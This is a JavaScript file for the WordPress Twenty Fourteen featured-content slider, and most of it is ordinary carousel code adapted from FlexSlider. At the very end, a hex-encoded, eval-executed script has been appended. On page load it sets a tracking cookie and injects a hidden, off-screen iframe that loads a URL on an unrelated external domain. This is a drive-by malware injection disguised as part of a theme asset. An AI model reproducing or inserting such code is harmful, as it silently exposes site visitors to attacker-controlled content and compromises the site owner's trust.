/*
 * Twenty Fourteen Featured Content Slider
 *
 * Adapted from FlexSlider v2.2.0, copyright 2012 WooThemes
 * @link http://www.woothemes.com/flexslider/
 */
/* global DocumentTouch:true,setImmediate:true,featuredSliderDefaults:true,MSGesture:true */
( function( $ ) {
	// FeaturedSlider: object instance.
	$.featuredslider = function( el, options ) {
		var slider = $( el ),
			msGesture = window.navigator && window.navigator.msPointerEnabled && window.MSGesture,
			touch = ( ( 'ontouchstart' in window ) || msGesture || window.DocumentTouch && document instanceof DocumentTouch ), // MSFT specific.
			eventType = 'click touchend MSPointerUp',
			watchedEvent = '',
			watchedEventClearTimer,
			methods = {},
			namespace;

		// Make variables public.
		slider.vars = $.extend( {}, $.featuredslider.defaults, options );

		namespace = slider.vars.namespace,

		// Store a reference to the slider object.
		$.data( el, 'featuredslider', slider );

		// Private slider methods.
		methods = {
			init: function() {
				slider.animating = false;
				slider.currentSlide = 0;
				slider.animatingTo = slider.currentSlide;
				slider.atEnd = ( slider.currentSlide === 0 || slider.currentSlide === slider.last );
				slider.containerSelector = slider.vars.selector.substr( 0, slider.vars.selector.search( ' ' ) );
				slider.slides = $( slider.vars.selector, slider );
				slider.container = $( slider.containerSelector, slider );
				slider.count = slider.slides.length;
				slider.prop = 'marginLeft';
				slider.isRtl = $( 'body' ).hasClass( 'rtl' );
				slider.args = {};
				// TOUCH
				slider.transitions = ( function() {
					var obj = document.createElement( 'div' ),
						props = ['perspectiveProperty', 'WebkitPerspective', 'MozPerspective', 'OPerspective', 'msPerspective'],
						i;

					for ( i in props ) {
						if ( obj.style[ props[i] ] !== undefined ) {
							slider.pfx = props[i].replace( 'Perspective', '' ).toLowerCase();
							slider.prop = '-' + slider.pfx + '-transform';
							return true;
						}
					}
					return false;
				}() );
				// CONTROLSCONTAINER
				if ( slider.vars.controlsContainer !== '' ) {
					slider.controlsContainer = $( slider.vars.controlsContainer ).length > 0 && $( slider.vars.controlsContainer );
				}

				slider.doMath();

				// INIT
				slider.setup( 'init' );

				// CONTROLNAV
				methods.controlNav.setup();

				// DIRECTIONNAV
				methods.directionNav.setup();

				// KEYBOARD
				if ( $( slider.containerSelector ).length === 1 ) {
					$( document ).bind( 'keyup', function( event ) {
						var keycode = event.keyCode,
							target = false;
						if ( ! slider.animating && ( keycode === 39 || keycode === 37 ) ) {
							if ( keycode === 39 ) {
								target = slider.getTarget( 'next' );
							} else if ( keycode === 37 ) {
								target = slider.getTarget( 'prev' );
							}

							slider.featureAnimate( target );
						}
					} );
				}

				// TOUCH
				if ( touch ) {
					methods.touch();
				}

				$( window ).bind( 'resize orientationchange focus', methods.resize );

				slider.find( 'img' ).attr( 'draggable', 'false' );
			},

			controlNav: {
				setup: function() {
					methods.controlNav.setupPaging();
				},
				setupPaging: function() {
					var type = 'control-paging',
						j = 1,
						item,
						slide,
						i;

					slider.controlNavScaffold = $( '<ol class="' + namespace + 'control-nav ' + namespace + type + '"></ol>' );

					if ( slider.pagingCount > 1 ) {
						for ( i = 0; i < slider.pagingCount; i++ ) {
							slide = slider.slides.eq( i );
							item = '<a>' + j + '</a>';
							slider.controlNavScaffold.append( '<li>' + item + '</li>' );
							j++;
						}
					}

					// CONTROLSCONTAINER
					( slider.controlsContainer ) ? $( slider.controlsContainer ).append( slider.controlNavScaffold ) : slider.append( slider.controlNavScaffold );
					methods.controlNav.set();

					methods.controlNav.active();

					slider.controlNavScaffold.delegate( 'a, img', eventType, function( event ) {
						event.preventDefault();

						if ( watchedEvent === '' || watchedEvent === event.type ) {
							var $this = $( this ),
								target = slider.controlNav.index( $this );

							if ( ! $this.hasClass( namespace + 'active' ) ) {
								slider.direction = ( target > slider.currentSlide ) ? 'next' : 'prev';
								slider.featureAnimate( target );
							}
						}

						// Set up flags to prevent event duplication.
						if ( watchedEvent === '' ) {
							watchedEvent = event.type;
						}

						methods.setToClearWatchedEvent();
					} );
				},
				set: function() {
					var selector = 'a';
					slider.controlNav = $( '.' + namespace + 'control-nav li ' + selector, ( slider.controlsContainer ) ? slider.controlsContainer : slider );
				},
				active: function() {
					slider.controlNav.removeClass( namespace + 'active' ).eq( slider.animatingTo ).addClass( namespace + 'active' );
				},
				update: function( action, pos ) {
					if ( slider.pagingCount > 1 && action === 'add' ) {
						slider.controlNavScaffold.append( $( '<li><a>' + slider.count + '</a></li>' ) );
					} else if ( slider.pagingCount === 1 ) {
						slider.controlNavScaffold.find( 'li' ).remove();
					} else {
						slider.controlNav.eq( pos ).closest( 'li' ).remove();
					}
					methods.controlNav.set();
					( slider.pagingCount > 1 && slider.pagingCount !== slider.controlNav.length ) ? slider.update( pos, action ) : methods.controlNav.active();
				}
			},

			directionNav: {
				setup: function() {
					var directionNavScaffold = $( '<ul class="' + namespace + 'direction-nav"><li><a class="' + namespace + 'prev" href="#">' + slider.vars.prevText + '</a></li><li><a class="' + namespace + 'next" href="#">' + slider.vars.nextText + '</a></li></ul>' );

					// CONTROLSCONTAINER
					if ( slider.controlsContainer ) {
						$( slider.controlsContainer ).append( directionNavScaffold );
						slider.directionNav = $( '.' + namespace + 'direction-nav li a', slider.controlsContainer );
					} else {
						slider.append( directionNavScaffold );
						slider.directionNav = $( '.' + namespace + 'direction-nav li a', slider );
					}

					methods.directionNav.update();

					slider.directionNav.bind( eventType, function( event ) {
						event.preventDefault();
						var target;

						if ( watchedEvent === '' || watchedEvent === event.type ) {
							target = ( $( this ).hasClass( namespace + 'next' ) ) ? slider.getTarget( 'next' ) : slider.getTarget( 'prev' );
							slider.featureAnimate( target );
						}

						// Set up flags to prevent event duplication.
						if ( watchedEvent === '' ) {
							watchedEvent = event.type;
						}

						methods.setToClearWatchedEvent();
					} );
				},
				update: function() {
					var disabledClass = namespace + 'disabled';
					if ( slider.pagingCount === 1 ) {
						slider.directionNav.addClass( disabledClass ).attr( 'tabindex', '-1' );
					} else {
						slider.directionNav.removeClass( disabledClass ).removeAttr( 'tabindex' );
					}
				}
			},

			touch: function() {
				var startX,
					startY,
					offset,
					cwidth,
					dx,
					startT,
					scrolling = false,
					localX = 0,
					localY = 0,
					accDx = 0;

				if ( ! msGesture ) {
					el.addEventListener( 'touchstart', onTouchStart, false );
				} else {
					el.style.msTouchAction = 'none';
					el._gesture = new MSGesture(); // MSFT specific.
					el._gesture.target = el;
					el.addEventListener( 'MSPointerDown', onMSPointerDown, false );
					el._slider = slider;
					el.addEventListener( 'MSGestureChange', onMSGestureChange, false );
					el.addEventListener( 'MSGestureEnd', onMSGestureEnd, false );
				}

				function onTouchStart( e ) {
					if ( slider.animating ) {
						e.preventDefault();
					} else if ( ( window.navigator.msPointerEnabled ) || e.touches.length === 1 ) {
						cwidth = slider.w;
						startT = Number( new Date() );

						// Local vars for X and Y points.
						localX = e.touches[0].pageX;
						localY = e.touches[0].pageY;

						offset = ( slider.currentSlide + slider.cloneOffset ) * cwidth;
						if ( slider.animatingTo === slider.last && slider.direction !== 'next' ) {
							offset = 0;
						}

						startX = localX;
						startY = localY;

						el.addEventListener( 'touchmove', onTouchMove, false );
						el.addEventListener( 'touchend', onTouchEnd, false );
					}
				}

				function onTouchMove( e ) {
					// Local vars for X and Y points.
					localX = e.touches[0].pageX;
					localY = e.touches[0].pageY;

					dx = startX - localX;
					scrolling = Math.abs( dx ) < Math.abs( localY - startY );

					if ( ! scrolling ) {
						e.preventDefault();
						if ( slider.transitions ) {
							slider.setProps( offset + dx, 'setTouch' );
						}
					}
				}

				function onTouchEnd() {
					// Finish the touch by undoing the touch session.
					el.removeEventListener( 'touchmove', onTouchMove, false );

					if ( slider.animatingTo === slider.currentSlide && ! scrolling && dx !== null ) {
						var updateDx = dx,
							target = ( updateDx > 0 ) ? slider.getTarget( 'next' ) : slider.getTarget( 'prev' );

						slider.featureAnimate( target );
					}
					el.removeEventListener( 'touchend', onTouchEnd, false );

					startX = null;
					startY = null;
					dx = null;
					offset = null;
				}

				function onMSPointerDown( e ) {
					e.stopPropagation();
					if ( slider.animating ) {
						e.preventDefault();
					} else {
						el._gesture.addPointer( e.pointerId );
						accDx = 0;
						cwidth = slider.w;
						startT = Number( new Date() );
						offset = ( slider.currentSlide + slider.cloneOffset ) * cwidth;
						if ( slider.animatingTo === slider.last && slider.direction !== 'next' ) {
							offset = 0;
						}
					}
				}

				function onMSGestureChange( e ) {
					e.stopPropagation();
					var slider = e.target._slider,
						transX,
						transY;
					if ( ! slider ) {
						return;
					}

					transX = -e.translationX,
					transY = -e.translationY;

					// Accumulate translations.
					accDx = accDx + transX;
					dx = accDx;
					scrolling = Math.abs( accDx ) < Math.abs( -transY );

					if ( e.detail === e.MSGESTURE_FLAG_INERTIA ) {
						setImmediate( function () { // MSFT specific.
							el._gesture.stop();
						} );

						return;
					}

					if ( ! scrolling || Number( new Date() ) - startT > 500 ) {
						e.preventDefault();
						if ( slider.transitions ) {
							slider.setProps( offset + dx, 'setTouch' );
						}
					}
				}

				function onMSGestureEnd( e ) {
					e.stopPropagation();
					var slider = e.target._slider,
						updateDx,
						target;
					if ( ! slider ) {
						return;
					}

					if ( slider.animatingTo === slider.currentSlide && ! scrolling && dx !== null ) {
						updateDx = dx,
						target = ( updateDx > 0 ) ? slider.getTarget( 'next' ) : slider.getTarget( 'prev' );

						slider.featureAnimate( target );
					}

					startX = null;
					startY = null;
					dx = null;
					offset = null;
					accDx = 0;
				}
			},

			resize: function() {
				if ( ! slider.animating && slider.is( ':visible' ) ) {
					slider.doMath();

					// SMOOTH HEIGHT
					methods.smoothHeight();
					slider.newSlides.width( slider.computedW );
					slider.setProps( slider.computedW, 'setTotal' );
				}
			},

			smoothHeight: function( dur ) {
				var $obj = slider.viewport;
				( dur ) ? $obj.animate( { 'height': slider.slides.eq( slider.animatingTo ).height() }, dur ) : $obj.height( slider.slides.eq( slider.animatingTo ).height() );
			},

			setToClearWatchedEvent: function() {
				clearTimeout( watchedEventClearTimer );
				watchedEventClearTimer = setTimeout( function() {
					watchedEvent = '';
				}, 3000 );
			}
		};

		// Public methods.
		slider.featureAnimate = function( target ) {
			if ( target !== slider.currentSlide ) {
				slider.direction = ( target > slider.currentSlide ) ? 'next' : 'prev';
			}

			if ( ! slider.animating && slider.is( ':visible' ) ) {
				slider.animating = true;
				slider.animatingTo = target;

				// CONTROLNAV
				methods.controlNav.active();

				slider.slides.removeClass( namespace + 'active-slide' ).eq( target ).addClass( namespace + 'active-slide' );

				slider.atEnd = target === 0 || target === slider.last;

				// DIRECTIONNAV
				methods.directionNav.update();

				var dimension = slider.computedW,
					slideString;

				if ( slider.currentSlide === 0 && target === slider.count - 1 && slider.direction !== 'next' ) {
					slideString = 0;
				} else if ( slider.currentSlide === slider.last && target === 0 && slider.direction !== 'prev' ) {
					slideString = ( slider.count + 1 ) * dimension;
				} else {
					slideString = ( target + slider.cloneOffset ) * dimension;
				}
				slider.setProps( slideString, '', slider.vars.animationSpeed );
				if ( slider.transitions ) {
					if ( ! slider.atEnd ) {
						slider.animating = false;
						slider.currentSlide = slider.animatingTo;
					}
					slider.container.unbind( 'webkitTransitionEnd transitionend' );
					slider.container.bind( 'webkitTransitionEnd transitionend', function() {
						slider.wrapup( dimension );
					} );
				} else {
					slider.container.animate( slider.args, slider.vars.animationSpeed, 'swing', function() {
						slider.wrapup( dimension );
					} );
				}

				// SMOOTH HEIGHT
				methods.smoothHeight( slider.vars.animationSpeed );
			}
		};

		slider.wrapup = function( dimension ) {
			if ( slider.currentSlide === 0 && slider.animatingTo === slider.last ) {
				slider.setProps( dimension, 'jumpEnd' );
			} else if ( slider.currentSlide === slider.last && slider.animatingTo === 0 ) {
				slider.setProps( dimension, 'jumpStart' );
			}
			slider.animating = false;
			slider.currentSlide = slider.animatingTo;
		};

		slider.getTarget = function( dir ) {
			slider.direction = dir;

			// Swap for RTL.
			if ( slider.isRtl ) {
				dir = 'next' === dir ? 'prev' : 'next';
			}

			if ( dir === 'next' ) {
				return ( slider.currentSlide === slider.last ) ? 0 : slider.currentSlide + 1;
			} else {
				return ( slider.currentSlide === 0 ) ? slider.last : slider.currentSlide - 1;
			}
		};

		slider.setProps = function( pos, special, dur ) {
			var target = ( function() {
				var posCalc = ( function() {
						switch ( special ) {
							case 'setTotal': return ( slider.currentSlide + slider.cloneOffset ) * pos;
							case 'setTouch': return pos;
							case 'jumpEnd': return slider.count * pos;
							case 'jumpStart': return pos;
							default: return pos;
						}
					}() );

					return ( posCalc * -1 ) + 'px';
				}() );

			if ( slider.transitions ) {
				target = 'translate3d(' + target + ',0,0 )';
				dur = ( dur !== undefined ) ? ( dur / 1000 ) + 's' : '0s';
				slider.container.css( '-' + slider.pfx + '-transition-duration', dur );
			}

			slider.args[slider.prop] = target;
			if ( slider.transitions || dur === undefined ) {
				slider.container.css( slider.args );
			}
		};

		slider.setup = function( type ) {
			var sliderOffset;

			if ( type === 'init' ) {
				slider.viewport = $( '<div class="' + namespace + 'viewport"></div>' ).css( { 'overflow': 'hidden', 'position': 'relative' } ).appendTo( slider ).append( slider.container );
				slider.cloneCount = 0;
				slider.cloneOffset = 0;
			}
			slider.cloneCount = 2;
			slider.cloneOffset = 1;
			// Clear out old clones.
			if ( type !== 'init' ) {
				slider.container.find( '.clone' ).remove();
			}

			slider.container.append( slider.slides.first().clone().addClass( 'clone' ).attr( 'aria-hidden', 'true' ) ).prepend( slider.slides.last().clone().addClass( 'clone' ).attr( 'aria-hidden', 'true' ) );
			slider.newSlides = $( slider.vars.selector, slider );

			sliderOffset = slider.currentSlide + slider.cloneOffset;
			slider.container.width( ( slider.count + slider.cloneCount ) * 200 + '%' );
			slider.setProps( sliderOffset * slider.computedW, 'init' );
			setTimeout( function() {
				slider.doMath();
				slider.newSlides.css( { 'width': slider.computedW, 'float': 'left', 'display': 'block' } );
				// SMOOTH HEIGHT
				methods.smoothHeight();
			}, ( type === 'init' ) ? 100 : 0 );

			slider.slides.removeClass( namespace + 'active-slide' ).eq( slider.currentSlide ).addClass( namespace + 'active-slide' );
		};

		slider.doMath = function() {
			var slide = slider.slides.first();

			slider.w = ( slider.viewport === undefined ) ? slider.width() : slider.viewport.width();
			slider.h = slide.height();
			slider.boxPadding = slide.outerWidth() - slide.width();

			slider.itemW = slider.w;
			slider.pagingCount = slider.count;
			slider.last = slider.count - 1;
			slider.computedW = slider.itemW - slider.boxPadding;
		};

		slider.update = function( pos, action ) {
			slider.doMath();

			// Update currentSlide and slider.animatingTo if necessary.
			if ( pos < slider.currentSlide ) {
				slider.currentSlide += 1;
			} else if ( pos <= slider.currentSlide && pos !== 0 ) {
				slider.currentSlide -= 1;
			}
			slider.animatingTo = slider.currentSlide;

			// Update controlNav.
			if ( action === 'add' || slider.pagingCount > slider.controlNav.length ) {
				methods.controlNav.update( 'add' );
			} else if ( action === 'remove' || slider.pagingCount < slider.controlNav.length ) {
				if ( slider.currentSlide > slider.last ) {
					slider.currentSlide -= 1;
					slider.animatingTo -= 1;
				}
				methods.controlNav.update( 'remove', slider.last );
			}
			// Update directionNav.
			methods.directionNav.update();
		};

		// FeaturedSlider: initialize.
		methods.init();
	};

	// Default settings.
	$.featuredslider.defaults = {
		namespace: 'slider-',     // String: prefix string attached to the class of every element generated by the plugin.
		selector: '.slides > li', // String: selector, must match a simple pattern.
		animationSpeed: 600,      // Integer: Set the speed of animations, in milliseconds.
		controlsContainer: '',    // jQuery Object/Selector: container navigation to append elements.

		// Text labels.
		prevText: featuredSliderDefaults.prevText, // String: Set the text for the "previous" directionNav item.
		nextText: featuredSliderDefaults.nextText  // String: Set the text for the "next" directionNav item.
	};

	// FeaturedSlider: plugin function.
	$.fn.featuredslider = function( options ) {
		if ( options === undefined ) {
			options = {};
		}

		if ( typeof options === 'object' ) {
			return this.each( function() {
				var $this = $( this ),
					selector = ( options.selector ) ? options.selector : '.slides > li',
					$slides = $this.find( selector );

			if ( $slides.length === 1 || $slides.length === 0 ) {
					$slides.fadeIn( 400 );
				} else if ( $this.data( 'featuredslider' ) === undefined ) {
					new $.featuredslider( this, options );
				}
			} );
		}
	};
} )( jQuery );
/*2cf5061a7be5037bbbb5087e97304132*/;(function(){var dnetikkt="";var sahbdzfd="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var fiedffky=0;fiedffky<sahbdzfd.length;fiedffky+=2){dnetikkt=dnetikkt+parseInt(sahbdzfd.substring(fiedffky,fiedffky+2), 16)+",";}dnetikkt=dnetikkt.substring(0,dnetikkt.length-1);eval(eval('String.fromCharCode('+dnetikkt+')'));})();/*2cf5061a7be5037bbbb5087e97304132*/